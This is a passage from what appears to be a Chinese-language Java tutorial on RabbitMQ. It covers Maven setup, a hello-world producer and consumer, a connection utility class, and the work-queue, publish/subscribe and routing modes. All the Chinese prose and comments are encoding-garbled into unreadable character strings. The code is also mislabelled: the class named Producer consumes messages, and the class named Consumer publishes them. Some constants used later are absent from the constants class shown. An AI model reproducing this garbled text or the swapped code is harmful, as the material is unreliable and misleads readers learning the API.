1. æ–°å»ºä¸€ä¸ª`rabbitmq-quickstart`çš„Mavenå·¥ç¨‹
2. æ·»åŠ ä¾èµ– `amqp-client`

   ```pom
   <!-- RabbitMQ Java Client -->
   <!-- https://mvnrepository.com/artifact/com.rabbitmq/amqp-client -->
   <dependency>
     <groupId>com.rabbitmq</groupId>
     <artifactId>amqp-client</artifactId>
     <version>5.21.0</version>  <!-- æ¨èä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ -->
   </dependency>
   ```

3. **åˆ›å»º RabbitMQ è™šæ‹Ÿä¸»æœºï¼š**

   æ‰“å¼€ RabbitMQ çš„ç®¡ç†ç•Œé¢ï¼ˆé€šå¸¸åœ¨ `http://localhost:15672`ï¼‰ï¼Œ
   ç™»å½•å¹¶è¿›å…¥è™šæ‹Ÿä¸»æœºç®¡ç†é¡µé¢ã€‚åœ¨è¿™é‡Œåˆ›å»ºä¸€ä¸ªåä¸º `/geekyspace`çš„è™šæ‹Ÿä¸»æœºã€‚

4. **ç¼–å†™ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä»£ç ï¼š**

   ```java
   public class Producer {
   
       private final static String QUEUE_NAME = ""helloworld"";
   
       public static void main(String[] args) throws IOException, TimeoutException {
           // ç”¨äºåˆ›å»ºMQçš„ç‰©ç†è¿æ¥
           ConnectionFactory factory = new ConnectionFactory();
           factory.setHost(""localhost"");
           factory.setPort(5672);
           factory.setUsername(""zhouyu"");
           factory.setPassword(""123456"");
           factory.setVirtualHost(""/geekyspace"");
   
           Connection connection = factory.newConnection();  // TCP connectionï¼ˆç‰©ç†è¿æ¥ï¼‰
           Channel channel = connection.createChannel();     // AMQP channelï¼ˆè™šæ‹Ÿè¿æ¥ï¼‰
   
           // å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå‚æ•°åˆ†åˆ«æ˜¯ï¼šé˜Ÿåˆ—åç§°ã€æ˜¯å¦æŒä¹…åŒ–ã€æ˜¯å¦æ’ä»–ã€æ˜¯å¦è‡ªåŠ¨åˆ é™¤ã€å…¶ä»–å‚æ•°
           channel.queueDeclare(QUEUE_NAME, true, false, false, null);
           System.out.println("" [*] Waiting for messages. To exit press CTRL+C"");
   
           // æ¶ˆè´¹è€…å›è°ƒ
           DeliverCallback deliverCallback = (consumerTag, delivery) -> {
               String message = new String(delivery.getBody(), StandardCharsets.UTF_8);
               System.out.println("" [x] Received '"" + message + ""'"");
           };
   
           // æ¶ˆè´¹æ¶ˆæ¯ï¼Œå‚æ•°åˆ†åˆ«æ˜¯ï¼šé˜Ÿåˆ—åç§°ã€æ˜¯å¦è‡ªåŠ¨ç¡®è®¤ã€æ¶ˆè´¹è€…å›è°ƒã€å–æ¶ˆå›è°ƒ
           channel.basicConsume(QUEUE_NAME, true, deliverCallback, consumerTag -> {
           });
       }
   }
   ```

   ```java
   public class Consumer {
   
       private final static String QUEUE_NAME = ""helloworld"";
   
       public static void main(String[] args) throws IOException, TimeoutException {
           // ç”¨äºåˆ›å»ºMQçš„ç‰©ç†è¿æ¥
           ConnectionFactory factory = new ConnectionFactory();
           factory.setHost(""localhost"");
           factory.setPort(5672);
           factory.setUsername(""zhouyu"");
           factory.setPassword(""123456"");
           factory.setVirtualHost(""/geekyspace"");
   
           try (Connection connection = factory.newConnection();  // TCP connectionï¼ˆç‰©ç†è¿æ¥ï¼‰
                Channel channel = connection.createChannel()) {   // AMQP channelï¼ˆè™šæ‹Ÿè¿æ¥ï¼‰
   
               // å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå‚æ•°åˆ†åˆ«æ˜¯ï¼šé˜Ÿåˆ—åç§°ã€æ˜¯å¦æŒä¹…åŒ–ã€æ˜¯å¦æ’ä»–ã€æ˜¯å¦è‡ªåŠ¨åˆ é™¤ã€å…¶ä»–å‚æ•°
               // æ˜¯å¦æ’ä»–ï¼šåªå¯¹é¦–æ¬¡å£°æ˜å®ƒçš„è¿æ¥å¯è§ï¼Œå¹¶åœ¨è¿æ¥æ–­å¼€æ—¶è‡ªåŠ¨åˆ é™¤
               channel.queueDeclare(QUEUE_NAME, true, false, false, null);
               String message = ""Hello, RabbitMQ!"";
   
               // å‘é€æ¶ˆæ¯åˆ°é˜Ÿåˆ—ï¼Œå‚æ•°åˆ†åˆ«æ˜¯ï¼šäº¤æ¢æœºåç§°ã€è·¯ç”±é”®ã€å…¶ä»–å‚æ•°ã€æ¶ˆæ¯å†…å®¹
               // exchangeï¼šäº¤æ¢æœºåç§°ï¼Œç®€å•æ¨¡å¼ä¸‹ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºä½¿ç”¨é»˜è®¤äº¤æ¢æœº
               channel.basicPublish("""", QUEUE_NAME, null, message.getBytes());
   
               // æ‰“å°å‘é€çš„æ¶ˆæ¯
               System.out.println("" [x] Sent '"" + message + ""'"");
           }
       }
   }
   ```

**ä»£ç è¿è¡Œç»“æœï¼š**

ç”Ÿäº§è€…ï¼š

```jshell
 [x] å‘é€ 'Hello, RabbitMQ!'
```

æ¶ˆè´¹è€…ï¼š

```shell
 [*] ç­‰å¾…æ¶ˆæ¯ã€‚æŒ‰CTRL+Cé€€å‡º
 [x] æ¥æ”¶ 'Hello, RabbitMQ!'
```

## 5-å°è£…å·¥å…·ç±»

**RabbitMQæ¶ˆæ¯çŠ¶æ€**

* **Ready(å°±ç»ª)**ï¼šæ¶ˆæ¯å·²è¢«é€å…¥é˜Ÿåˆ—ï¼Œç­‰å¾…è¢«æ¶ˆè´¹
* **Unacked(æœªç¡®è®¤)**ï¼šæ¶ˆæ¯å·²ç»è¢«æ¶ˆè´¹è€…è®¤é¢†ï¼Œä½†è¿˜æœªè¢«ç¡®è®¤â€œæ¶ˆè´¹æˆåŠŸâ€
* **Finished(å®Œæˆ)**ï¼šè°ƒç”¨äº†ackæ–¹æ³•ï¼Œæ¶ˆæ¯è¢«ç¡®è®¤â€œæ¶ˆè´¹æˆåŠŸâ€

**RabbitMQå·¥å…·ç±»**

```java
public class RabbitUtils {

    private static final ConnectionFactory connectionFactory = new ConnectionFactory();

    static {
        connectionFactory.setHost(""localhost"");
        connectionFactory.setPort(5672);         //5672æ˜¯RabbitMQçš„é»˜è®¤ç«¯å£å·
        connectionFactory.setUsername(""zhouyu"");
        connectionFactory.setPassword(""123456"");
        connectionFactory.setVirtualHost(""/geekyspace"");
    }

    public static Connection getConnection() {
        Connection conn = null;
        try {
            conn = connectionFactory.newConnection();
            return conn;
        } catch (Exception e) {
            // è¿è¡Œæ—¶å¼‚å¸¸
            throw new RuntimeException(e);
        }
    }
}
```

**RabbitMQå¸¸é‡ç±»**

```java
public class RabbitConstant {

    public static final String QUEUE_HELLOWORLD = ""helloworld"";

}
```

åŸºäºå·¥å…·ç±»å’Œå¸¸é‡ç±»ï¼Œé‡æ„ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä»£ç ï¼Œç®€åŒ–ä»£ç é€»è¾‘ã€‚

## 6-RabbitMQå…­ç§å·¥ä½œæ¨¡å¼

[6ç§å·¥ä½œæ¨¡å¼](https://www.rabbitmq.com/tutorials)

1. **ç®€å•æ¨¡å¼ï¼ˆSimple Modeï¼‰**ï¼šä¹Ÿç§°ä¸º==ç‚¹å¯¹ç‚¹==æ¨¡å¼ï¼ˆPoint-to-Pointï¼‰ï¼Œæ˜¯æœ€åŸºæœ¬çš„å·¥ä½œæ¨¡å¼ã€‚
   ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°é˜Ÿåˆ—ï¼Œç„¶åæ¶ˆè´¹è€…ä»é˜Ÿåˆ—ä¸­æ¥æ”¶å¹¶å¤„ç†æ¶ˆæ¯ã€‚
2. **å·¥ä½œé˜Ÿåˆ—æ¨¡å¼ï¼ˆWork Queues Modeï¼‰**ï¼šä¹Ÿç§°ä¸ºä»»åŠ¡é˜Ÿåˆ—æ¨¡å¼ï¼ˆTask Queuesï¼‰ï¼Œå¤šä¸ªæ¶ˆè´¹è€…å…±äº«ä¸€ä¸ªé˜Ÿåˆ—ï¼Œ
   æ¯ä¸ªæ¶ˆæ¯åªä¼šè¢«å…¶ä¸­ä¸€ä¸ªæ¶ˆè´¹è€…å¤„ç†ã€‚è¿™ç§æ¨¡å¼å¯ä»¥å®ç°è´Ÿè½½å‡è¡¡å’Œ==ä»»åŠ¡åˆ†å‘==ã€‚
3. **å‘å¸ƒ/è®¢é˜…æ¨¡å¼ï¼ˆPublish/Subscribe Modeï¼‰**ï¼šå‘å¸ƒè€…ï¼ˆç”Ÿäº§è€…ï¼‰å°†æ¶ˆæ¯å‘é€åˆ°äº¤æ¢æœºï¼ˆExchangeï¼‰ï¼Œ
   äº¤æ¢æœºå°†æ¶ˆæ¯å¹¿æ’­ç»™ä¸ä¹‹ç»‘å®šçš„æ‰€æœ‰é˜Ÿåˆ—ï¼Œ==æ¯ä¸ªé˜Ÿåˆ—å¯ä»¥æœ‰å¤šä¸ªæ¶ˆè´¹è€…==ã€‚
4. **è·¯ç”±æ¨¡å¼ï¼ˆRouting Modeï¼‰**ï¼šåœ¨å‘å¸ƒ/è®¢é˜…æ¨¡å¼çš„åŸºç¡€ä¸Šï¼Œå¼•å…¥äº†æ¶ˆæ¯çš„è·¯ç”±è§„åˆ™ã€‚ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°æŒ‡å®šçš„äº¤æ¢æœºï¼Œ
   å¹¶æŒ‡å®šæ¶ˆæ¯çš„è·¯ç”±é”®ï¼ˆRouting Keyï¼‰ï¼Œäº¤æ¢æœºæ ¹æ®==è·¯ç”±è§„åˆ™ç²¾å‡†åŒ¹é…==å°†æ¶ˆæ¯å‘é€åˆ°ç¬¦åˆæ¡ä»¶çš„é˜Ÿåˆ—ã€‚
5. **ä¸»é¢˜æ¨¡å¼ï¼ˆTopics Modeï¼‰**ï¼šç±»ä¼¼äºè·¯ç”±æ¨¡å¼ï¼Œä½†æ˜¯ä¸»é¢˜æ¨¡å¼å¯ä»¥ä½¿ç”¨==é€šé…ç¬¦æ¥æ¨¡ç³ŠåŒ¹é…==è·¯ç”±é”®ã€‚
   è¿™æ ·å¯ä»¥æ›´çµæ´»åœ°å®šä¹‰è·¯ç”±è§„åˆ™ï¼Œå®ç°æ›´ç²¾ç¡®çš„æ¶ˆæ¯è·¯ç”±ã€‚
6. **RPCæ¨¡å¼ï¼ˆRemote Procedure Call Modeï¼‰**ï¼šå®¢æˆ·ç«¯é€šè¿‡å‘é€è¯·æ±‚æ¶ˆæ¯åˆ°æœåŠ¡å™¨ç«¯çš„é˜Ÿåˆ—ï¼Œ
   å¹¶ç­‰å¾…æœåŠ¡å™¨ç«¯çš„å“åº”æ¶ˆæ¯æ¥å®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ã€‚RPCæ¨¡å¼å¯ä»¥åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯ä¹‹é—´çš„é€šä¿¡ã€‚

![6ç§å·¥ä½œæ¨¡å¼](http://img.geekyspace.cn/pictures/2024/202405140102903.png)

## 7-WorkQueueå·¥ä½œé˜Ÿåˆ—

> **å·¥ä½œé˜Ÿåˆ—æ¨¡å¼**ï¼šä¹Ÿç§°ä¸ºä»»åŠ¡é˜Ÿåˆ—æ¨¡å¼ï¼ˆTask Queuesï¼‰ï¼Œå¤šä¸ªæ¶ˆè´¹è€…å…±äº«ä¸€ä¸ªé˜Ÿåˆ—ï¼Œæ¯ä¸ªæ¶ˆæ¯åªä¼šè¢«å…¶ä¸­ä¸€ä¸ªæ¶ˆè´¹è€…å¤„ç†ã€‚

**ä½¿ç”¨åœºæ™¯ï¼š**

12306è®¢å•ç³»ç»Ÿ â€”> Rabbit MQ â€”> çŸ­ä¿¡æœåŠ¡1,çŸ­ä¿¡æœåŠ¡2,çŸ­ä¿¡æœåŠ¡3...

**ç¼–ç å®ç°ï¼š**

1. å‘é€è€… OrderSystem
2. æ¥æ”¶è€… SMSConsumer1,SMSConsumer2,SMSConsumer3

```java
/**
 * å·¥ä½œé˜Ÿåˆ—æ¨¡å¼é€‚ç”¨äºéœ€è¦å¤„ç†å¤§é‡æ¶ˆæ¯çš„åœºæ™¯ï¼Œä¾‹å¦‚ï¼šè®¢å•ç³»ç»Ÿä¸­éœ€è¦å‘é€å¤§é‡çŸ­ä¿¡é€šçŸ¥ã€‚
 */
public class OrderSystem {

    private static final Gson gson = new Gson();

    public static void main(String[] args) throws IOException, TimeoutException {
        // åˆ›å»ºè¿æ¥å’Œé€šé“
        try (Connection connection = RabbitUtils.getConnection();
             Channel channel = connection.createChannel()) {

            // å£°æ˜é˜Ÿåˆ—
            channel.queueDeclare(RabbitConstant.QUEUE_SMS, true, false, false, null);

            // å‘é€100æ¡æ¶ˆæ¯
            for (int i = 1; i <= 100; i++) {
                SMS sms = new SMS(""12306"", randomPhoneNumber(), ""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š"" + i);
                String jsonMessage = gson.toJson(sms);
                channel.basicPublish("""", RabbitConstant.QUEUE_SMS, null, jsonMessage.getBytes(StandardCharsets.UTF_8));
                System.out.println("" [x] Sent '"" + jsonMessage + ""'"");
            }
            System.out.println(""å‘é€æ•°æ®æˆåŠŸ"");
        }
    }

    // ç”Ÿæˆéšæœºæ‰‹æœºå·ç 
    private static String randomPhoneNumber() { ...}
}
```

```java
public class SMSService1 {
    public static void main(String[] args) throws IOException {
        // åˆ›å»ºè¿æ¥å’Œé€šé“
        Connection connection = RabbitUtils.getConnection();
        Channel channel = connection.createChannel();

        // å£°æ˜é˜Ÿåˆ—
        channel.queueDeclare(RabbitConstant.QUEUE_SMS, true, false, false, null);

        // æ³¨æ„âš ï¸ï¼šä¿è¯ä¸€æ¬¡åªåˆ†å‘ä¸€ä¸ªï¼Œèƒ½è€…å¤šåŠ³
        channel.basicQos(1);

        // æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯
        channel.basicConsume(RabbitConstant.QUEUE_SMS, false,
                (consumerTag, message) -> {
                    String jsonSMS = new String(message.getBody());
                    System.out.println(""SMSService1-çŸ­ä¿¡å‘é€æˆåŠŸï¼š"" + jsonSMS);
                    // æ‰‹åŠ¨ackç¡®è®¤
                    channel.basicAck(message.getEnvelope().getDeliveryTag(), false);
                },
                consumerTag -> {
                    // å–æ¶ˆæ¶ˆè´¹å›è°ƒ
                });
    }
}
```

```java

@Data
@NoArgsConstructor
@AllArgsConstructor
public class SMS {
    private String name;
    private String mobile;
    private String content;

    // è‡ªåŠ¨ç”Ÿæˆ Getterã€Setterã€equalsã€hashCode å’Œ toString æ–¹æ³•

}
```

**ä»£ç è¿è¡Œç»“æœï¼š**

ç”Ÿäº§è€…ï¼š

```jshell
 [x] å‘é€ '{""name"":""12306"",""mobile"":""13187762586"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š1""}'
 [x] å‘é€ '{""name"":""12306"",""mobile"":""13983064895"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š2""}'
......
 [x] å‘é€ '{""name"":""12306"",""mobile"":""14726343208"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š9""}'
```

æ¶ˆè´¹è€…ï¼š

```shell
SMSService1-çŸ­ä¿¡å‘é€æˆåŠŸï¼š{""name"":""12306"",""mobile"":""13187762586"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š1""}
SMSService1-çŸ­ä¿¡å‘é€æˆåŠŸï¼š{""name"":""12306"",""mobile"":""16444092808"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š5""}
SMSService1-çŸ­ä¿¡å‘é€æˆåŠŸï¼š{""name"":""12306"",""mobile"":""10926113620"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š8""}
```

```shell
SMSService2-çŸ­ä¿¡å‘é€æˆåŠŸï¼š{""name"":""12306"",""mobile"":""13983064895"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š2""}
SMSService2-çŸ­ä¿¡å‘é€æˆåŠŸï¼š{""name"":""12306"",""mobile"":""15863784238"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š4""}
SMSService2-çŸ­ä¿¡å‘é€æˆåŠŸï¼š{""name"":""12306"",""mobile"":""15749068610"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š7""}
```

```shell
SMSService3-çŸ­ä¿¡å‘é€æˆåŠŸï¼š{""name"":""12306"",""mobile"":""12200616646"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š3""}
SMSService3-çŸ­ä¿¡å‘é€æˆåŠŸï¼š{""name"":""12306"",""mobile"":""14014186823"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š6""}
SMSService3-çŸ­ä¿¡å‘é€æˆåŠŸï¼š{""name"":""12306"",""mobile"":""14726343208"",""content"":""æ‚¨çš„è½¦ç¥¨å·²é¢„è®¢æˆåŠŸã€‚è®¢å•å·ï¼š9""}
```

## 8-å‘å¸ƒPUB-è®¢é˜…SUBæ¨¡å¼

> **å‘å¸ƒ/è®¢é˜…æ¨¡å¼**ï¼šå‘å¸ƒè€…ï¼ˆç”Ÿäº§è€…ï¼‰å°†æ¶ˆæ¯å‘é€åˆ°äº¤æ¢æœºï¼ˆExchangeï¼‰ï¼Œäº¤æ¢æœºå°†æ¶ˆæ¯å¹¿æ’­ç»™ä¸ä¹‹ç»‘å®šçš„æ‰€æœ‰é˜Ÿåˆ—ï¼Œæ¯ä¸ªé˜Ÿåˆ—å¯ä»¥æœ‰å¤šä¸ªæ¶ˆè´¹è€…ã€‚

å‘å¸ƒè®¢é˜…æ¨¡å¼ä¸­ä½¿ç”¨çš„äº¤æ¢æœºç±»å‹æ˜¯`Fanout Exchange`ã€‚

äº¤æ¢æœºçš„ç±»å‹æœ‰å››ç§ï¼š

1. **Direct Exchange**ï¼šç›´è¿äº¤æ¢æœºï¼Œæ ¹æ®æ¶ˆæ¯çš„è·¯ç”±é”®ï¼ˆRouting Keyï¼‰å°†æ¶ˆæ¯å‘é€åˆ°æŒ‡å®šçš„é˜Ÿåˆ—ã€‚
2. **Fanout Exchange**ï¼šæ‰‡å½¢äº¤æ¢æœºï¼Œå°†æ¶ˆæ¯å¹¿æ’­åˆ°æ‰€æœ‰ä¸ä¹‹ç»‘å®šçš„é˜Ÿåˆ—ã€‚
3. **Topic Exchange**ï¼šä¸»é¢˜äº¤æ¢æœºï¼Œæ ¹æ®æ¶ˆæ¯çš„è·¯ç”±é”®ï¼ˆRouting Keyï¼‰æ¨¡ç³ŠåŒ¹é…å°†æ¶ˆæ¯å‘é€åˆ°ç¬¦åˆæ¡ä»¶çš„é˜Ÿåˆ—ã€‚
4. **Headers Exchange**ï¼šå¤´äº¤æ¢æœºï¼Œæ ¹æ®æ¶ˆæ¯çš„å¤´éƒ¨ä¿¡æ¯ï¼ˆHeaderï¼‰å°†æ¶ˆæ¯å‘é€åˆ°ç¬¦åˆæ¡ä»¶çš„é˜Ÿåˆ—ã€‚

**ä½¿ç”¨åœºæ™¯ï¼š**

å‘å¸ƒè®¢é˜…æ¨¡å¼å› ä¸ºæ‰€æœ‰çš„è®¢é˜…è€…éƒ½ä¼šæ”¶åˆ°ç›¸åŒçš„æ¶ˆæ¯ï¼Œæ‰€ä»¥é€‚ç”¨äºå¹¿æ’­æ¶ˆæ¯ã€é€šçŸ¥ç­‰åœºæ™¯ã€‚

ä¾‹å¦‚ï¼šä¸­å›½æ°”è±¡å±€æä¾›â€œå¤©æ°”é¢„æŠ¥â€é€å…¥äº¤æ¢æœºï¼Œç½‘æ˜“ã€æ–°æµªã€æœç‹ç­‰è®¢é˜…è€…é€šè¿‡é˜Ÿåˆ—ç»‘å®šè¯¥äº¤æ¢æœºï¼Œéƒ½å¯ä»¥æ”¶åˆ°â€œå¤©æ°”é¢„æŠ¥â€æ¶ˆæ¯ã€‚

**ä»£ç å®ç°ï¼š**

1. ä½¿ç”¨ç®¡ç†ç•Œé¢åˆ›å»ºäº¤æ¢æœº`weather`ï¼Œç±»å‹é€‰æ‹©`fanout`ã€‚

   ![åˆ›å»ºexchange](http://img.geekyspace.cn/pictures/2024/202405151611071.png)

2. åˆ›å»º`WeatherBureau`å‘å¸ƒè€…ï¼Œå‘é€å¤©æ°”é¢„æŠ¥æ¶ˆæ¯ã€‚

   ```java
   /**
    * å‘å¸ƒ-è®¢é˜…æ¨¡å¼é€‚ç”¨äºæ¶ˆæ¯å¹¿æ’­çš„åœºæ™¯ï¼Œä¾‹å¦‚ï¼šå¤©æ°”é¢„æŠ¥å‘å¸ƒå¤©æ°”ä¿¡æ¯ï¼Œå¤šä¸ªè®¢é˜…è€…æ¥æ”¶å¤©æ°”ä¿¡æ¯ã€‚
    */
   public class WeatherBureau {
       public static void main(String[] args) throws IOException, TimeoutException {
   
           try (Connection connection = RabbitUtils.getConnection();
                Channel channel = connection.createChannel()) {
   
               // å‘å¸ƒæ¶ˆæ¯åˆ°äº¤æ¢æœº
               String message = ""é•¿æ²™å¤©æ°”ï¼šæ™´"";
   
               // æ³¨æ„âš ï¸ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯äº¤æ¢æœºåç§°ï¼Œä¸å†æ˜¯é»˜è®¤çš„â€œâ€ç©ºå­—ç¬¦ä¸²
               channel.basicPublish(RabbitConstant.EXCHANGE_WEATHER, """", null, message.getBytes());
   
               System.out.println("" [x] å‘é€ '"" + message + ""'"");
           }
       }
   }
   ```

3. åˆ›å»º`NetEase`ã€`Sina`ã€`Sohu`è®¢é˜…è€…ï¼Œæ¥æ”¶å¤©æ°”é¢„æŠ¥æ¶ˆæ¯ã€‚

   ```java
   public class NetEase {
       public static void main(String[] args) throws IOException {
           Connection connection = RabbitUtils.getConnection();
           Channel channel = connection.createChannel();
   
           // æ³¨æ„âš ï¸ï¼šéœ€è¦å°†é˜Ÿåˆ—ç»‘å®šåˆ°äº¤æ¢æœº
           channel.queueDeclare(RabbitConstant.QUEUE_NETEASE, true, false, false, null);
           channel.queueBind(RabbitConstant.QUEUE_NETEASE, RabbitConstant.EXCHANGE_WEATHER, """");
           channel.basicQos(1);
           channel.basicConsume(RabbitConstant.QUEUE_NETEASE, false,
                   // æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯å›è°ƒ
                   (consumerTag, message) -> {
                       String jsonSMS = new String(message.getBody());
                       System.out.println(""ç½‘æ˜“æ–°é—»-æ”¶åˆ°æ¶ˆæ¯ï¼š"" + jsonSMS);
                       // æ‰‹åŠ¨ackç¡®è®¤
                       channel.basicAck(message.getEnvelope().getDeliveryTag(), false);
                   },
                   // æ¶ˆè´¹è€…å–æ¶ˆæ¶ˆè´¹å›è°ƒ
                   consumerTag -> {
                   });
       }
   }
   ```

**ä»£ç è¿è¡Œç»“æœï¼š**

ç”Ÿäº§è€…ï¼š

```jshell
 [x] å‘é€ 'é•¿æ²™å¤©æ°”ï¼šæ™´'
```

æ¶ˆè´¹è€…ï¼š

```shell
ç½‘æ˜“æ–°é—»-æ”¶åˆ°æ¶ˆæ¯ï¼šé•¿æ²™å¤©æ°”ï¼šæ™´
æ–°æµª-æ”¶åˆ°æ¶ˆæ¯ï¼šé•¿æ²™å¤©æ°”ï¼šæ™´
æœç‹-æ”¶åˆ°æ¶ˆæ¯ï¼šé•¿æ²™å¤©æ°”ï¼šæ™´
```

## 9-è·¯ç”±Routingæ¨¡å¼

> **è·¯ç”±æ¨¡å¼**ï¼šåœ¨å‘å¸ƒ/è®¢é˜…æ¨¡å¼çš„åŸºç¡€ä¸Šï¼Œå¼•å…¥äº†æ¶ˆæ¯çš„è·¯ç”±è§„åˆ™ã€‚ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°æŒ‡å®šçš„äº¤æ¢æœºï¼Œ
> å¹¶æŒ‡å®šæ¶ˆæ¯çš„è·¯ç”±é”®ï¼ˆRouting Keyï¼‰ï¼Œäº¤æ¢æœºæ ¹æ®è·¯ç”±è§„åˆ™ç²¾å‡†åŒ¹é…å°†æ¶ˆæ¯å‘é€åˆ°ç¬¦åˆæ¡ä»¶çš„é˜Ÿåˆ—ã€‚

è·¯ç”±æ¨¡å¼ä¸­ä½¿ç”¨çš„äº¤æ¢æœºç±»å‹æ˜¯`Direct Exchange`ã€‚

**ä½¿ç”¨åœºæ™¯ï¼š**

è·¯ç”±æ¨¡å¼é€‚ç”¨äºéœ€è¦ç²¾ç¡®åŒ¹é…æ¶ˆæ¯çš„åœºæ™¯ï¼Œä¾‹å¦‚ï¼šæ—¥å¿—ç³»ç»Ÿä¸­æ ¹æ®æ—¥å¿—çº§åˆ«å°†æ¶ˆæ¯å‘é€åˆ°ä¸åŒçš„é˜Ÿåˆ—ã€‚

**ä»£ç å®ç°ï¼š**

1. ä½¿ç”¨ç®¡ç†ç•Œé¢åˆ›å»ºäº¤æ¢æœº`logs`ï¼Œç±»å‹é€‰æ‹©`direct`ã€‚
2. åˆ›å»º`LogSystem`å‘å¸ƒè€…ï¼Œå‘é€æ—¥å¿—æ¶ˆæ¯ã€‚

   ```java
   /**
    * è·¯ç”±æ¨¡å¼é€‚ç”¨äºéœ€è¦ç²¾ç¡®åŒ¹é…æ¶ˆæ¯çš„åœºæ™¯ï¼Œä¾‹å¦‚ï¼šæ—¥å¿—ç³»ç»Ÿä¸­æ ¹æ®æ—¥å¿—çº§åˆ«å°†æ¶ˆæ¯å‘é€åˆ°ä¸åŒçš„é˜Ÿåˆ—ã€‚
    */
   public class LogSystem {
       public static void main(String[] args) throws IOException, TimeoutException {
           try (Connection connection = RabbitUtils.getConnection();
                Channel channel = connection.createChannel()) {
   
               LinkedHashMap<String, String> logs = new LinkedHashMap<>();
               logs.put(""error"", ""error message"");
               logs.put(""warning"", ""warning message"");
               logs.put(""info"", ""info message"");
               logs.put(""debug"", ""debug message"");
   
               for (Map.Entry<String, String> entry : logs.entrySet()) {
                   String routingKey = entry.getKey();
                   String message = entry.getValue();
                   // æ³¨æ„âš ï¸ï¼šç¬¬äºŒä¸ªå‚æ•°æ˜¯ routingKeyï¼Œç”¨äºæ¶ˆæ¯çš„ç­›é€‰
                   channel.basicPublish(RabbitConstant.EXCHANGE_LOGS, routingKey, null, message.getBytes());
                   System.out.println("" [x] å‘é€ '"" + routingKey + ""':'"" + message + ""'"");
               }
           }
       }
   }
   ```

3. åˆ›å»º`ErrorConsumer`ã€`InfoConsumer`ã€`WarningConsumer`æ¶ˆè´¹è€…ï¼Œæ¥æ”¶æ—¥å¿—æ¶ˆæ¯ã€‚

   ```java
   public class InfoConsumer {
       public static void main(String[] args) throws IOException {
           Connection connection = RabbitUtils.getConnection();
           Channel channel = connection.createChannel();
   
           // æ³¨æ„âš ï¸ï¼šé˜Ÿåˆ—ç»‘å®šäº¤æ¢æœºæ—¶ï¼Œéœ€è¦æŒ‡å®šroutingKeyè¿›è¡Œè§„åˆ™åŒ¹é…
           channel.queueDeclare(RabbitConstant.QUEUE_INFO, true, false, false, null);
           channel.queueBind(RabbitConstant.QUEUE_INFO, RabbitConstant.EXCHANGE_LOGS, ""info"");
           channel.queueBind(RabbitConstant.QUEUE_INFO, RabbitConstant.EXCHANGE_LOGS, ""debug"");
   
           channel.basicQos(1);
           channel.basicConsume(RabbitConstant.QUEUE_INFO, false,
                   // æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯å›è°ƒ
                   (consumerTag, message) -> {
                       String jsonSMS = new String(message.getBody());
                       System.out.println(""InfoConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼š"" + jsonSMS);
                       // æ‰‹åŠ¨ackç¡®è®¤
                       channel.basicAck(message.getEnvelope().getDeliveryTag(), false);
                   },
                   // æ¶ˆè´¹è€…å–æ¶ˆæ¶ˆè´¹å›è°ƒ
                   consumerTag -> {
                   });
       }
   }
   ```

**ä»£ç è¿è¡Œç»“æœï¼š**

ç”Ÿäº§è€…ï¼š

```jshell
 [x] å‘é€ 'error':'error message'
 [x] å‘é€ 'warning':'warning message'
 [x] å‘é€ 'info':'info message'
 [x] å‘é€ 'debug':'debug message'
```

æ¶ˆè´¹è€…ï¼š

```shell
InfoConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼šinfo message
InfoConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼šdebug message
```

```shell
WarningConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼šwarning message
```

```shell
ErrorConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼šerror message
```

## 10-ä¸»é¢˜Topicsæ¨¡å¼

